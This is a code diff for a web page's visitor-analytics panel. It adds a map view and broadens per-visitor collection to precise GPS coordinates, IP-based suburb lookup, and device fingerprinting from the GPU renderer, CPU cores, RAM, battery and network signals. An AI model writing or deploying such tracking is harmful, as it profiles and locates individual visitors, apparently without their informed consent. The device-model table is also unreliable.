@@ -3324,6 +3324,15 @@ function backToProfiles(){
         font-weight:700;padding:2px 8px;border-radius:99px;display:none;">● LIVE</span>
     </div>
     <div style="display:flex;gap:10px;align-items:center;">
+      <!-- Tab switcher -->
+      <div style="display:flex;background:#0f0820;border:1px solid #2a1f50;border-radius:8px;overflow:hidden;">
+        <button id="_tab_list" onclick="_viTab('list')" style="background:#7c3aed;border:none;color:#fff;
+          padding:6px 14px;cursor:pointer;font-size:12px;font-family:inherit;font-weight:600;">
+          ☰ List</button>
+        <button id="_tab_map" onclick="_viTab('map')" style="background:transparent;border:none;color:#7c7a9a;
+          padding:6px 14px;cursor:pointer;font-size:12px;font-family:inherit;">
+          🗺 Map</button>
+      </div>
       <button onclick="_viForceRetrack(this)" style="background:#0a1a00;border:1px solid #166534;
         color:#86efac;padding:6px 14px;border-radius:7px;cursor:pointer;
         font-size:12px;font-family:inherit;">⚡ Re-track</button>
@@ -3409,6 +3418,9 @@ function backToProfiles(){
     </div>
   </div>
 
+  <!-- ══ LIST VIEW (default) ══ -->
+  <div id="_vi_listview" style="display:contents;">
+
   <!-- Breakdown bars -->
   <div id="_vi_breaks" style="display:flex;gap:14px;padding:14px 24px 0;flex-shrink:0;flex-wrap:wrap;">
     <div style="background:#120d28;border:1px solid #2a1f50;border-radius:10px;
@@ -3449,42 +3461,19 @@ function backToProfiles(){
         <table id="_vi_table" style="width:100%;border-collapse:collapse;font-size:11.5px;">
           <thead>
             <tr style="background:#0f0820;">
-              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;
-                text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;
-                border-bottom:1px solid #2a1f50;">📍</th>
-              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;
-                text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;
-                border-bottom:1px solid #2a1f50;">Time (IST)</th>
-              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;
-                text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;
-                border-bottom:1px solid #2a1f50;">IP</th>
-              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;
-                text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;
-                border-bottom:1px solid #2a1f50;">City</th>
-              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;
-                text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;
-                border-bottom:1px solid #2a1f50;">Suburb</th>
-              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;
-                text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;
-                border-bottom:1px solid #2a1f50;">PIN</th>
-              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;
-                text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;
-                border-bottom:1px solid #2a1f50;">Model</th>
-              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;
-                text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;
-                border-bottom:1px solid #2a1f50;">OS</th>
-              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;
-                text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;
-                border-bottom:1px solid #2a1f50;">Browser</th>
-              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;
-                text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;
-                border-bottom:1px solid #2a1f50;">Screen</th>
-              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;
-                text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;
-                border-bottom:1px solid #2a1f50;">ISP</th>
-              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;
-                text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;
-                border-bottom:1px solid #2a1f50;">TZ</th>
+              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;border-bottom:1px solid #2a1f50;">📍</th>
+              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;border-bottom:1px solid #2a1f50;">Time (IST)</th>
+              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#a78bfa;white-space:nowrap;border-bottom:1px solid #2a1f50;">Model</th>
+              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#a78bfa;white-space:nowrap;border-bottom:1px solid #2a1f50;">OS</th>
+              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#a78bfa;white-space:nowrap;border-bottom:1px solid #2a1f50;">Browser</th>
+              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#a78bfa;white-space:nowrap;border-bottom:1px solid #2a1f50;">CPU</th>
+              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#a78bfa;white-space:nowrap;border-bottom:1px solid #2a1f50;">RAM</th>
+              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#a78bfa;white-space:nowrap;border-bottom:1px solid #2a1f50;">Network</th>
+              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#a78bfa;white-space:nowrap;border-bottom:1px solid #2a1f50;">Battery</th>
+              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#a78bfa;white-space:nowrap;border-bottom:1px solid #2a1f50;">Screen</th>
+              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;border-bottom:1px solid #2a1f50;">City</th>
+              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;border-bottom:1px solid #2a1f50;">IP</th>
+              <th style="padding:9px 12px;text-align:left;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#7c7a9a;white-space:nowrap;border-bottom:1px solid #2a1f50;">ISP</th>
             </tr>
           </thead>
           <tbody id="_vi_tbody">
@@ -3495,7 +3484,41 @@ function backToProfiles(){
       </div>
     </div>
   </div>
-</div>
+
+  </div><!-- /#_vi_listview -->
+
+  <!-- ══ MAP VIEW ══ -->
+  <div id="_vi_mapview" style="display:none;flex:1;flex-direction:column;min-height:0;">
+    <!-- Map legend bar -->
+    <div style="padding:10px 24px;display:flex;gap:20px;align-items:center;flex-shrink:0;
+      border-bottom:1px solid #2a1f50;background:#0f0820;flex-wrap:wrap;">
+      <span style="font-size:11px;color:#7c7a9a;">
+        <span style="color:#10b981;font-size:14px;">●</span> GPS precise &nbsp;
+        <span style="color:#f59e0b;font-size:14px;">●</span> IP estimated &nbsp;
+        <span style="font-size:13px;">📍</span> Click pin for details
+      </span>
+      <span id="_vi_mapcount" style="font-size:11px;color:#7c7a9a;margin-left:auto;">—</span>
+    </div>
+    <!-- Leaflet map fills remaining height -->
+    <div id="_vi_map" style="flex:1;min-height:0;"></div>
+    <!-- Visitor detail card — shown on pin click -->
+    <div id="_vi_mapcard" style="display:none;position:absolute;bottom:80px;left:50%;
+      transform:translateX(-50%);background:#120d28;border:1px solid #7c3aed;
+      border-radius:12px;padding:16px 20px;min-width:280px;max-width:420px;
+      z-index:9999;box-shadow:0 8px 32px rgba(0,0,0,.6);font-size:12px;">
+      <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px;">
+        <span id="_vi_mapcard_model" style="font-size:14px;font-weight:700;color:#c084fc;"></span>
+        <button onclick="document.getElementById('_vi_mapcard').style.display='none'"
+          style="background:none;border:none;color:#7c7a9a;cursor:pointer;font-size:16px;line-height:1;">✕</button>
+      </div>
+      <div id="_vi_mapcard_body" style="line-height:1.9;color:#a0a0c0;"></div>
+    </div>
+  </div>
+
+</div><!-- /#_vi_panel -->
+
+<!-- Leaflet CSS + JS (loaded only when map tab is first opened) -->
+<link id="_leaflet_css" rel="stylesheet" href="" disabled/>
 
 <script>
 /* ════════════════════════════════════════════════════════════
@@ -3531,107 +3554,147 @@ function backToProfiles(){
     try{ localStorage.setItem('_vi_last', String(Date.now())); }catch(e){}
   }
 
-  /* ── iOS model lookup (screen px × DPR → model name) ────── */
-  /* Browser never exposes model; we reverse-engineer from resolution */
-  var _IOS_MODELS = [
-    /* w,   h,   dpr, model(s) */
-    [320,  568,  2,   'iPhone 5 / 5S / SE (1st gen)'],
-    [375,  667,  2,   'iPhone 6 / 7 / 8 / SE (2nd/3rd gen)'],
-    [414,  736,  3,   'iPhone 6+ / 7+ / 8+'],
-    [375,  812,  3,   'iPhone X / XS / 11 Pro / 12 Mini / 13 Mini'],
-    [414,  896,  2,   'iPhone XR / 11'],
-    [414,  896,  3,   'iPhone XS Max / 11 Pro Max'],
-    [390,  844,  3,   'iPhone 12 / 12 Pro / 13 / 13 Pro / 14'],
-    [428,  926,  3,   'iPhone 12 Pro Max / 13 Pro Max / 14 Plus'],
-    [393,  852,  3,   'iPhone 14 Pro / 15 / 15 Pro'],
-    [430,  932,  3,   'iPhone 14 Pro Max / 15 Plus / 15 Pro Max'],
-    [402,  874,  3,   'iPhone 16'],
-    [440,  956,  3,   'iPhone 16 Plus'],
-    [402,  874,  3,   'iPhone 16 Pro'],   /* same as 16 base — best guess */
-    [440,  956,  3,   'iPhone 16 Pro Max'],
-    [768, 1024,  2,   'iPad (various)'],
-    [820, 1180,  2,   'iPad Air (4th/5th gen)'],
-    [834, 1194,  2,   'iPad Pro 11"'],
-    [1024,1366,  2,   'iPad Pro 12.9"'],
+  /* ════════════════════════════════════════════════════════
+     DEVICE IDENTIFICATION ENGINE
+     Uses screen dims + iOS version together to narrow model.
+     iOS version alone can't do it; screen alone can't do it;
+     combined they get within 1-2 models in most cases.
+     ════════════════════════════════════════════════════════ */
+
+  /* Extract major iOS version number from UA */
+  function _iOSVer(ua){
+    var m=ua.match(/(?:iPhone|iPad).*OS (\d+)[_\d]*/);
+    return m ? parseInt(m[1],10) : 0;
+  }
+
+  /* iOS model table — each entry:
+     [w, h, dpr, minIOSver, maxIOSver, model_label]
+     Rows are checked top-to-bottom; first match wins.
+     iOS version ranges are based on when Apple allowed
+     each screen size to ship and when models go EOL.   */
+  var _IOS_TBL = [
+    /* ── iPhone 17 series (iOS 19+, Sep 2025) ── */
+    [393, 852, 3, 19,99, 'iPhone 17 / 17 Air'],
+    [402, 874, 3, 19,99, 'iPhone 17 Pro'],
+    [440, 956, 3, 19,99, 'iPhone 17 Pro Max'],
+
+    /* ── iPhone 16 series (iOS 18, Sep 2024) ── */
+    [390, 844, 3, 18,18, 'iPhone 16'],
+    [430, 932, 3, 18,18, 'iPhone 16 Plus'],
+    [402, 874, 3, 18,18, 'iPhone 16 Pro'],
+    [440, 956, 3, 18,18, 'iPhone 16 Pro Max'],
+
+    /* ── iPhone 15 series (iOS 17, Sep 2023) ── */
+    [393, 852, 3, 17,17, 'iPhone 15 / 15 Pro'],
+    [430, 932, 3, 17,17, 'iPhone 15 Plus / 15 Pro Max'],
+
+    /* ── iPhone 14 series (iOS 16, Sep 2022) ── */
+    [390, 844, 3, 16,16, 'iPhone 14 / 14 Pro'],
+    [428, 926, 3, 16,16, 'iPhone 14 Plus'],
+    [393, 852, 3, 16,16, 'iPhone 14 Pro'],
+    [430, 932, 3, 16,16, 'iPhone 14 Pro Max'],
+
+    /* ── iPhone 13 series (iOS 15, Sep 2021) ── */
+    [375, 812, 3, 15,15, 'iPhone 13 Mini'],
+    [390, 844, 3, 15,15, 'iPhone 13 / 13 Pro'],
+    [428, 926, 3, 15,15, 'iPhone 13 Pro Max'],
+
+    /* ── iPhone 12 series (iOS 14, Oct 2020) ── */
+    [375, 812, 3, 14,14, 'iPhone 12 Mini'],
+    [390, 844, 3, 14,14, 'iPhone 12 / 12 Pro'],
+    [428, 926, 3, 14,14, 'iPhone 12 Pro Max'],
+
+    /* ── Older (iOS 13 and below) — wider ranges ── */
+    [375, 812, 3,  0,13, 'iPhone X / XS / 11 Pro'],
+    [414, 896, 2,  0,13, 'iPhone XR / 11'],
+    [414, 896, 3,  0,13, 'iPhone XS Max / 11 Pro Max'],
+    [375, 667, 2,  0,13, 'iPhone 6 / 7 / 8 / SE2 / SE3'],
+    [414, 736, 3,  0,13, 'iPhone 6+ / 7+ / 8+'],
+    [320, 568, 2,  0,13, 'iPhone 5 / SE (1st gen)'],
+
+    /* ── iPad (all generations, any iOS) ── */
+    [768, 1024, 2,  0,99, 'iPad (standard)'],
+    [820, 1180, 2,  0,99, 'iPad Air'],
+    [834, 1194, 2,  0,99, 'iPad Pro 11"'],
+    [1024,1366, 2,  0,99, 'iPad Pro 12.9"'],
+    [744, 1133, 2,  0,99, 'iPad mini'],
   ];
-  function _iosModel(){
+
+  function _iosModel(ua){
+    var ver = _iOSVer(ua);
     var sw=screen.width, sh=screen.height, dpr=window.devicePixelRatio||1;
-    /* Normalise to portrait */
     var w=Math.min(sw,sh), h=Math.max(sw,sh);
-    for(var i=0;i<_IOS_MODELS.length;i++){
-      var r=_IOS_MODELS[i];
-      if(r[0]===w && r[1]===h && Math.abs(r[2]-dpr)<0.5) return r[3];
+    /* Try exact iOS version match first */
+    for(var i=0;i<_IOS_TBL.length;i++){
+      var r=_IOS_TBL[i];
+      if(r[0]===w && r[1]===h && Math.abs(r[2]-dpr)<0.5 && ver>=r[3] && ver<=r[4])
+        return r[5];
     }
-    return null; /* unrecognised — will fall back to "iPhone" */
-  }
-
-  /* ── Mumbai PIN → suburb lookup ──────────────────────────── */
-  /* Covers all major Mumbai/MMR pincodes → readable suburb name */
-  var _MUM_PIN = {
-    /* South Mumbai */
-    '400001':'Fort / CST','400002':'Mandvi','400003':'Masjid Bunder',
-    '400004':'Girgaon','400005':'Colaba','400006':'Malabar Hill',
-    '400007':'Grant Road','400008':'Mumbai Central','400009':'Mahalaxmi',
-    '400010':'Mazgaon','400011':'Parel','400012':'Dadar (W)',
-    '400013':'Dadar (E)','400014':'Naigaon / Worli','400015':'Sewri',
-    '400016':'Mahim','400017':'Dharavi','400018':'Worli',
-    '400019':'Chembur','400020':'Churchgate / Nariman Pt',
-    '400021':'Cuffe Parade','400022':'Sion',
-    /* Western Suburbs */
-    '400050':'Bandra (W)','400051':'Bandra (E)',
-    '400052':'Santacruz (W)','400053':'Andheri (W)',
-    '400054':'Vile Parle (W)','400055':'Santacruz (E)',
-    '400056':'Vile Parle (E)','400057':'Andheri (E)',
-    '400058':'Jogeshwari (W)','400059':'Goregaon (W)',
-    '400060':'Goregaon (E)','400061':'Malad (W)',
-    '400062':'Malad (E)','400063':'Kandivali (W)',
-    '400064':'Kandivali (E)','400065':'Borivali (W)',
-    '400066':'Borivali (E)','400067':'Dahisar (E)',
-    '400068':'Dahisar (W)',
-    /* Eastern Suburbs */
-    '400070':'Kurla','400071':'Ghatkopar (W)',
-    '400072':'Ghatkopar (E)','400075':'Vikhroli (W)',
-    '400076':'Vikhroli (E)','400077':'Kanjurmarg',
-    '400078':'Bhandup (W)','400078':'Bhandup (E)',
-    '400079':'Nahur','400080':'Mulund (W)',
-    '400081':'Mulund (E)','400082':'Thane (W)',
-    '400083':'Thane (E)',
-    /* Navi Mumbai / MMR */
-    '400701':'Navi Mumbai / Belapur','400703':'Airoli',
-    '400705':'Ghansoli','400706':'Koparkhairane',
-    '400708':'Turbhe','400709':'Sanpada / Juinagar',
-    '400710':'Nerul','400614':'Panvel',
-    /* Thane */
-    '400601':'Thane','400602':'Thane (E)',
-    '400603':'Wagle Estate','400604':'Kolshet',
-    '400605':'Kapurbawdi','400606':'Manpada',
-    /* Mira-Bhayander */
-    '401101':'Mira Road','401105':'Bhayander (W)',
-    '401106':'Bhayander (E)',
-  };
-  function _pinToSuburb(zip){
-    if(!zip) return '';
-    var pin=String(zip).trim();
-    return _MUM_PIN[pin]||'';
-  }
-
-  /* ── Android model from UA ───────────────────────────────── */
-  function _androidModel(ua){
-    /* UA format: (Linux; Android X.X; MODEL Build/...) */
-    var m=ua.match(/;\s*([^;)]+?)\s*(?:Build\/|MIUI\/|\))/);
-    if(m){
-      var candidate=m[1].trim();
-      /* Filter out OS strings */
-      if(!/^Android|^Linux|^Mobile/.test(candidate) && candidate.length>2)
-        return candidate;
+    /* Fallback: ignore iOS version, just match screen */
+    for(var j=0;j<_IOS_TBL.length;j++){
+      var s=_IOS_TBL[j];
+      if(s[0]===w && s[1]===h && Math.abs(s[2]-dpr)<0.5) return s[5]+'*';
     }
     return null;
   }
 
-  /* ── UA Parser ─────────────────────────────────────────── */
+  /* ── Android model — pulled straight from UA ─────────────── */
+  function _androidModel(ua){
+    var m=ua.match(/;\s*([^;)]+?)\s*(?:Build\/|MIUI\/|HMNote|\))/);
+    if(m){
+      var c=m[1].trim();
+      if(!/^Android|^Linux|^Mobile|^SM-[A-Z]\d{3}$/.test(c) && c.length>2) return c;
+    }
+    /* Samsung model code fallback — SM-S928B → Galaxy S24 Ultra etc. */
+    var sm=ua.match(/\b(SM-[A-Z]\d{3,4}[A-Z0-9]*)\b/);
+    return sm ? sm[1] : null;
+  }
+
+  /* ── WebGL GPU renderer — identifies chipset generation ──── */
+  function _getGPU(){
+    try{
+      var c=document.createElement('canvas');
+      var gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+      if(!gl) return '';
+      var ext=gl.getExtension('WEBGL_debug_renderer_info');
+      return ext ? (gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)||'') : '';
+    }catch(e){ return ''; }
+  }
+
+  /* ── Hardware signals (async — battery needs Promise) ───────
+     Returns a plain object; all fields optional / best-effort. */
+  function _getHardware(cb){
+    var hw={
+      cpu_cores : navigator.hardwareConcurrency||'',
+      ram_gb    : navigator.deviceMemory||'',        /* Chrome/Android only */
+      gpu       : _getGPU(),
+      touch_pts : navigator.maxTouchPoints||0,
+      color_depth: screen.colorDepth||'',
+      hdr       : (window.matchMedia&&window.matchMedia('(dynamic-range: high)').matches)?'yes':'no',
+    };
+    /* Network info */
+    var nc=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+    if(nc){
+      hw.connection    = nc.effectiveType||nc.type||'';
+      hw.downlink_mbps = nc.downlink||'';
+      hw.rtt_ms        = nc.rtt||'';
+      hw.save_data     = nc.saveData?'yes':'no';
+    }
+    /* Battery (best-effort — not available on iOS) */
+    if(navigator.getBattery){
+      navigator.getBattery().then(function(b){
+        hw.battery_pct = Math.round(b.level*100)+'%';
+        hw.charging    = b.charging?'yes':'no';
+        cb(hw);
+      }).catch(function(){ cb(hw); });
+    } else {
+      cb(hw);
+    }
+  }
+
+  /* ── UA Parser ──────────────────────────────────────────── */
   function _parseUA(ua){
     var d='Desktop',o='Unknown',b='Unknown',model='',m;
-    /* Device type */
     if(/iPhone/.test(ua))                             d='iPhone';
     else if(/iPad/.test(ua))                          d='iPad';
     else if(/Android/.test(ua)&&/Mobile/.test(ua))    d='Android Phone';
@@ -3639,32 +3702,47 @@ function backToProfiles(){
     else if(/Macintosh/.test(ua))                     d='Mac';
     else if(/Windows/.test(ua))                       d='Windows PC';
     else if(/Linux/.test(ua))                         d='Linux';
-    /* OS version */
+    /* OS */
     if((m=ua.match(/iPhone OS ([\d_]+)/)))            o='iOS '+m[1].replace(/_/g,'.');
     else if((m=ua.match(/iPad.*OS ([\d_]+)/)))        o='iPadOS '+m[1].replace(/_/g,'.');
     else if((m=ua.match(/Android ([\d.]+)/)))         o='Android '+m[1];
-    else if((m=ua.match(/Windows NT ([\d.]+)/)))      o='Windows NT '+m[1];
+    else if((m=ua.match(/Windows NT ([\d.]+)/)))      o='Windows '+m[1];
     else if((m=ua.match(/Mac OS X ([\d_]+)/)))        o='macOS '+m[1].replace(/_/g,'.');
-    /* Browser */
-    if(/CriOS/.test(ua))                              b='Chrome iOS';
-    else if(/FxiOS/.test(ua))                         b='Firefox iOS';
-    else if(/EdgiOS/.test(ua))                        b='Edge iOS';
-    else if(/SamsungBrowser/.test(ua))                b='Samsung Internet';
-    else if(/OPR|OPiOS/.test(ua))                     b='Opera';
-    else if(/Edg\//.test(ua))                         b='Edge';
-    else if(/Chrome\//.test(ua))                      b='Chrome';
-    else if(/Firefox\//.test(ua))                     b='Firefox';
-    else if(/Safari\//.test(ua)&&!/Chrome/.test(ua)) b='Safari';
-    /* Specific model */
+    /* Browser + version */
+    var bv='';
+    if(/CriOS\/([\d.]+)/.test(ua))                    { b='Chrome iOS';      bv=RegExp.$1.split('.')[0]; }
+    else if(/FxiOS\/([\d.]+)/.test(ua))               { b='Firefox iOS';     bv=RegExp.$1.split('.')[0]; }
+    else if(/EdgiOS\/([\d.]+)/.test(ua))              { b='Edge iOS';        bv=RegExp.$1.split('.')[0]; }
+    else if(/SamsungBrowser\/([\d.]+)/.test(ua))      { b='Samsung Internet';bv=RegExp.$1.split('.')[0]; }
+    else if(/OPR\/([\d.]+)/.test(ua))                 { b='Opera';           bv=RegExp.$1.split('.')[0]; }
+    else if(/Edg\/([\d.]+)/.test(ua))                 { b='Edge';            bv=RegExp.$1.split('.')[0]; }
+    else if(/Chrome\/([\d.]+)/.test(ua))              { b='Chrome';          bv=RegExp.$1.split('.')[0]; }
+    else if(/Firefox\/([\d.]+)/.test(ua))             { b='Firefox';         bv=RegExp.$1.split('.')[0]; }
+    else if(/Version\/([\d.]+).*Safari/.test(ua))     { b='Safari';          bv=RegExp.$1.split('.')[0]; }
+    /* Model */
     if(/iPhone/.test(ua)||/iPad/.test(ua)){
-      model=_iosModel()||d; /* e.g. "iPhone 14 Pro / 15" */
+      model=_iosModel(ua)||d;
     } else if(/Android/.test(ua)){
-      model=_androidModel(ua)||d; /* e.g. "Pixel 7 Pro" */
-    } else {
-      model=d;
-    }
-    return{device:model, deviceType:d, os:o, browser:b};
+      model=_androidModel(ua)||d;
+    } else { model=d; }
+    return{device:model, deviceType:d, os:o, browser:b, browserVer:bv};
   }
+
+  /* ── Mumbai PIN → suburb (kept as geo fallback) ─────────── */
+  var _MUM_PIN={'400001':'Fort','400005':'Colaba','400006':'Malabar Hill',
+    '400008':'Mumbai Central','400011':'Parel','400012':'Dadar W',
+    '400013':'Dadar E','400016':'Mahim','400018':'Worli','400019':'Chembur',
+    '400050':'Bandra W','400051':'Bandra E','400052':'Santacruz W',
+    '400053':'Andheri W','400054':'Vile Parle W','400055':'Santacruz E',
+    '400056':'Vile Parle E','400057':'Andheri E','400058':'Jogeshwari W',
+    '400059':'Goregaon W','400060':'Goregaon E','400061':'Malad W',
+    '400062':'Malad E','400063':'Kandivali W','400064':'Kandivali E',
+    '400065':'Borivali W','400066':'Borivali E','400067':'Dahisar E',
+    '400068':'Dahisar W','400070':'Kurla','400071':'Ghatkopar W',
+    '400072':'Ghatkopar E','400078':'Bhandup','400080':'Mulund W',
+    '400081':'Mulund E','400601':'Thane','400701':'Navi Mumbai',
+    '401101':'Mira Road'};
+  function _pinToSuburb(z){ return _MUM_PIN[String(z||'').trim()]||''; }
 
   /* ── Normalise any geo API response → common shape ───────── */
   function _geoNorm(g, src){
@@ -3762,20 +3840,35 @@ function backToProfiles(){
     if(_alreadyLogged()){ return; }
     var p=_parseUA(navigator.userAgent);
     var v={
-      ts        :new Date().toISOString(),
-      device    :p.device, deviceType:p.deviceType,
-      os        :p.os, browser:p.browser,
-      screen    :screen.width+'x'+screen.height,
-      viewport  :window.innerWidth+'x'+window.innerHeight,
-      dpr       :+(window.devicePixelRatio||1).toFixed(2),
-      tz        :(Intl&&Intl.DateTimeFormat?Intl.DateTimeFormat().resolvedOptions().timeZone:''),
-      lang      :navigator.language||'',
-      ref       :document.referrer||'direct',
-      gps       :'denied',   /* updated to 'yes' if GPS granted */
+      ts          :new Date().toISOString(),
+      /* ── Device ── */
+      device      :p.device,       /* e.g. "iPhone 17 Pro" */
+      deviceType  :p.deviceType,   /* e.g. "iPhone" */
+      os          :p.os,           /* e.g. "iOS 19.0" */
+      browser     :p.browser+(p.browserVer?' '+p.browserVer:''),
+      screen      :screen.width+'x'+screen.height,
+      viewport    :window.innerWidth+'x'+window.innerHeight,
+      dpr         :+(window.devicePixelRatio||1).toFixed(2),
+      /* ── Hardware (filled by _getHardware) ── */
+      cpu_cores:'', ram_gb:'', gpu:'',
+      connection:'', downlink_mbps:'', rtt_ms:'', save_data:'',
+      battery_pct:'', charging:'',
+      touch_pts:'', color_depth:'', hdr:'',
+      /* ── Context ── */
+      tz          :(Intl&&Intl.DateTimeFormat?Intl.DateTimeFormat().resolvedOptions().timeZone:''),
+      lang        :navigator.language||'',
+      ref         :document.referrer||'direct',
+      gps         :'denied',
+      /* ── Geo (filled after geo calls) ── */
       ip:'',country:'',region:'',city:'',suburb:'',zip:'',lat:'',lon:'',isp:'',locality:''
     };
 
     function _finish(){ _pushVisit(v); }
+
+    /* Collect hardware signals — runs in parallel with geo */
+    _getHardware(function(hw){
+      Object.keys(hw).forEach(function(k){ v[k]=hw[k]; });
+    });
 
     function _doIPFallback(){
       _tryIPGeo(v, 0, _finish);
@@ -3795,7 +3888,9 @@ function backToProfiles(){
         function(pos){
           if(_gpsDone) return; _gpsDone=true; clearTimeout(_gpsTimer);
           var lat=pos.coords.latitude, lon=pos.coords.longitude;
-          v.lat=String(lat); v.lon=String(lon);
+          var acc=pos.coords.accuracy; /* accuracy radius in metres */
+          v.lat=lat.toFixed(6); v.lon=lon.toFixed(6);
+          v.gps_accuracy_m=Math.round(acc);
           v.gps='yes';
           console.log('[Analytics] GPS granted ✓ lat:'+lat+' lon:'+lon);
           /* Reverse geocode the PRECISE GPS coordinates */
@@ -3813,7 +3908,7 @@ function backToProfiles(){
           _doIPFallback();
         },
         /* Options: high accuracy, 8 second timeout */
-        { enableHighAccuracy:true, timeout:8000, maximumAge:0 }
+        { enableHighAccuracy:true, timeout:20000, maximumAge:0 }
       );
     } else {
       /* Geolocation not supported (old browser / insecure context) */
@@ -3937,19 +4032,37 @@ function backToProfiles(){
     /* Table */
     var rows='';
     _data.forEach(function(r){
+      /* battery display */
+      var bat = r.battery_pct ? (r.battery_pct+(r.charging==='yes'?' ⚡':'')) : '—';
+      /* network display */
+      var net = [r.connection, r.downlink_mbps?(r.downlink_mbps+'Mbps'):''].filter(Boolean).join(' ');
+      /* device model — asterisk means iOS ver wasn't matched exactly */
+      var modelLabel = (r.device||'—');
+      var modelExact = modelLabel.indexOf('*')<0;
       rows+='<tr style="border-bottom:1px solid rgba(42,31,80,.35);">' +
-        '<td style="padding:8px 12px;text-align:center;" title="'+(r.gps==='yes'?'GPS precise':'IP estimated')+'">'+(r.gps==='yes'?'<span style="color:#10b981;font-size:14px;" title="GPS precise">📍</span>':'<span style="color:#7c7a9a;font-size:12px;" title="IP estimated">~</span>')+'</td>' +
-        _td(_fmtDate(r.ts),         'color:#6ee7b7') +
-        _td(r.ip||'—',              'color:#7c7a9a;font-family:monospace;font-size:10.5px') +
-        _td(r.city||'—',            'color:#c084fc;font-weight:600') +
-        _td((r.suburb||(r.district?r.district:'—'))+(r.locality?' · <span style="color:#7c7a9a;font-size:10px">'+_esc(r.locality)+'</span>':''), (r.suburb||r.district)?'color:#ddd6fe;font-weight:500':'color:#7c7a9a') +
-        _td(r.zip||'—',             'color:#7c7a9a') +
-        _tdchip(r.device||'—',      '#10b981','#022c22') +
-        _td(r.os||'—',              '') +
-        _tdchip(r.browser||'—',     '#f59e0b','#1c1400') +
-        _td((r.screen||'—'),        'color:#7c7a9a') +
-        _td(r.isp||'—',             'color:#7c7a9a;max-width:120px;overflow:hidden;text-overflow:ellipsis') +
-        _td(r.tz||'—',              'color:#7c7a9a') +
+        '<td style="padding:8px 12px;text-align:center;">'+(r.gps==='yes'?'<span style="color:#10b981;" title="GPS precise">📍</span>':'<span style="color:#7c7a9a;" title="IP estimated">~</span>')+'</td>' +
+        _td(_fmtDate(r.ts), 'color:#6ee7b7;white-space:nowrap') +
+        /* MODEL — highlighted purple, exact vs approximate */
+        '<td style="padding:8px 12px;white-space:nowrap;">'+
+          '<span style="color:'+(modelExact?'#c084fc':'#a78bfa')+';font-weight:700;">'+_esc(modelLabel.replace('*',''))+'</span>'+
+          (modelExact?'':' <span style="color:#7c7a9a;font-size:10px;" title="iOS version not exact">~</span>')+
+        '</td>' +
+        _td(r.os||'—',            'color:#e2e0f0') +
+        _tdchip(r.browser||'—',   '#f59e0b','#1c1400') +
+        /* CPU cores */
+        _td(r.cpu_cores?(r.cpu_cores+' cores'):'—', 'color:#7c7a9a') +
+        /* RAM */
+        _td(r.ram_gb?(r.ram_gb+'GB'):'—',           'color:#7c7a9a') +
+        /* Network */
+        _td(net||'—',                                'color:#7c7a9a') +
+        /* Battery */
+        _td(bat,                                     'color:'+(r.charging==='yes'?'#34d399':'#7c7a9a')) +
+        /* Screen + DPR */
+        _td((r.screen||'—')+(r.dpr?' @'+r.dpr+'x':''), 'color:#7c7a9a;font-size:11px') +
+        /* Location */
+        _td((r.city||'—')+(r.suburb&&r.suburb!==r.city?' · '+r.suburb:''), 'color:#c084fc') +
+        _td(r.ip||'—',            'color:#7c7a9a;font-family:monospace;font-size:10.5px') +
+        _td(r.isp||'—',           'color:#7c7a9a') +
         '</tr>';
     });
     document.getElementById('_vi_tbody').innerHTML=rows||
